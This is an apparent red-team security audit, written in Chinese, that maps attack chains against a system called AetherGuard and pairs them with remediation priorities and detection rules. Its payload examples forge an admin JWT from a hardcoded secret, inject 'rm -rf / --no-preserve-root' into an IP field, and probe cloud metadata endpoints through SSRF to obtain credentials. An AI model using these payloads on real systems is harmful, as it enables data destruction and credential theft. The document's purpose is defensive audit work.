# AetherGuard - 攻击路径分析

**生成日期**: 2026-02-16
**目标系统**: AetherGuard v2.0.0

---

## 攻击链概览

```
1. 初始访问 → 2. 凭证获取 → 3. 权限提升
   ↓              ↓              ↓
GitHub泄露    硬编码密钥    JWT伪造
(CVE-001)     (CVE-001)    (CVE-001)

4. 横向移动 → 5. 数据窃取 → 6. 持久化
   ↓              ↓              ↓
Agent接管     数据库转储    Agent植入
(CVE-014)     SQLite文件    (后门)
```

---

## 高危攻击链组合

### 链 A: 完全系统接管 (Critical)

**影响**: 完全系统控制
**难度**: 低
**时间**: < 10 分钟
**CVSS**: 9.8

```
GitHub泄露 → 硬编码密钥 → JWT伪造 → 命令注入 → RCE
   (CVE-001)    (CVE-001)    (CVE-001)    (CVE-002)
```

**攻击步骤**:

1. **获取源代码**: 通过 GitHub 公开仓库或泄露获取源码
2. **提取密钥**: 从 `.env` 提取 JWT_SECRET、API Keys
3. **Token 伪造**: 使用泄露密钥生成管理员 JWT
4. **API 访问**: 使用伪造 Token 访问管理员端点
5. **命令注入**: 在 `/agents/:id/block` 注入恶意 IP 参数
6. **RCE**: 执行任意系统命令，完全控制系统

**Payload 示例**:
```bash
# Step 1: 伪造 JWT Token
export JWT_SECRET="AetherGuardJwtSecret_for_prod_2026_very_long_1234567890"
node -e "const jwt = require('jsonwebtoken'); console.log(jwt.sign({userId: 'admin', role: 'admin'}, process.env.JWT_SECRET));"

# Step 2: 命令注入
POST /api/agents/agent-xxx/block
Authorization: Bearer {forged_token}
Content-Type: application/json

{
  "ip": "1.1.1.1; rm -rf / --no-preserve-root || echo pwned",
  "duration": 3600
}
```

---

### 链 B: Agent 网络横向移动 (High)

**影响**: 内网横向移动、云服务权限提升
**难度**: 中
**时间**: < 30 分钟
**CVSS**: 8.5

```
Agent API Key泄露 → Agent接管 → SSRF探测 → 云凭证获取 → 云资源访问
     (CVE-014)        (CVE-004)   (CVE-025)   [Metadata]
```

**攻击步骤**:

1. **API Key 获取**: 从数据库 (明文存储) 获取 Agent API Key
2. **WebSocket 连接**: 使用 API Key 连接 Agent Gateway
3. **Agent 伪装**: 伪装成合法 Agent 发送心跳
4. **SSRF 探测**: 利用扫描器的 URL 参数探测内网
5. **Metadata 访问**: 访问 AWS/GCP/Azure Metadata 服务
6. **凭证获取**: 获取云实例临时凭证
7. **云资源访问**: 访问云存储、数据库等资源

**Payload 示例**:
```javascript
// Step 1: WebSocket 连接
const io = require('socket.io-client');
const socket = io('ws://AetherGuard:3005', {
  auth: {
    type: 'agent',
    agentId: 'compromised-agent-id',
    apiKey: 'stolen-api-key-from-database'
  }
});

// Step 2: SSRF 探测
POST /api/scanner/tasks
Authorization: Bearer {admin_token}

{
  "targets": {
    "urls": [
      "http://169.254.169.254/latest/meta-data/iam/security-credentials/",
      "http://169.254.169.254/computeMetadata/v1/instance/service-accounts/default/token",
      "http://10.0.0.1:8080/admin"
    ],
    "host": { "mode": "local", "includeSystem": false }
  }
}
```

---

### 链 C: 持久化后门植入 (High)

**影响**: 长期隐蔽控制
**难度**: 高
**时间**: > 1 小时
**CVSS**: 7.8

```
JWT伪造 → Admin权限 → 植入恶意Agent → 后门C2通道
(CVE-001)             (CVE-004)        [Implant]
```

**攻击步骤**:

1. **JWT 伪造**: 使用泄露密钥生成 Admin Token
2. **Agent 注册**: 使用 Admin API 注册恶意 Agent
3. **恶意代码**: 植入修改后的 Agent 代码
4. **后门通道**: 建立隐蔽 C2 通信
5. **持久化**: 确保后门在系统重启后存活
6. **反取证**: 隐藏攻击痕迹

---

## 攻击路径优先级矩阵

| 攻击链 | 影响 | 难度 | 时间 | 优先级 |
|--------|------|------|------|--------|
| 链 A: 完全系统接管 | 🔴 严重 | 低 | <10分钟 | **P0 - 立即修复** |
| 链 B: Agent 横向移动 | 🟠 高 | 中 | <30分钟 | **P1 - 7天内修复** |
| 链 C: 持久化后门 | 🟠 高 | 高 | >1小时 | **P1 - 7天内修复** |

---

## 检测指标 (IOC)

### 恶意请求特征

```yaml
# 命令注入检测
http_request:
  method: POST
  path: "/api/agents/*/block"
  body_contains:
    - ";"
    - "&&"
    - "||"
    - "$("
    - "`${"

# 异常 JWT Token
jwt_token:
  signature_algorithm: "HS256"
  claims:
    role: "admin"
  issuer_mismatch: true

# SSRF 探测
http_request:
  method: POST
  path: "/api/scanner/tasks"
  body_contains:
    - "169.254.169.254"  # AWS Metadata
    - "metadata.google.internal"  # GCP Metadata
    - "10.0.0."
    - "192.168."
```

### 异常行为检测

```yaml
# 异常登录行为
authentication:
  - source_ip: "*"
    user_agent: "*"
    login_success_rate: "< 20%"  # 暴力破解

# 异常 Agent 行为
agent_activity:
  - connection_count: "> 100/min"  # DDoS 或扫描
  - command_response_time: "> 10s"  # 可能的劫持

# 异常 API 调用
api_usage:
  - rate: "> 1000/min"  # 扫描或滥用
  - error_rate: "> 50%"  # 探测行为
```

---

*生成时间: 2026-02-16 21:45 UTC*
*审计人员: Red Team Intelligence Analyst*
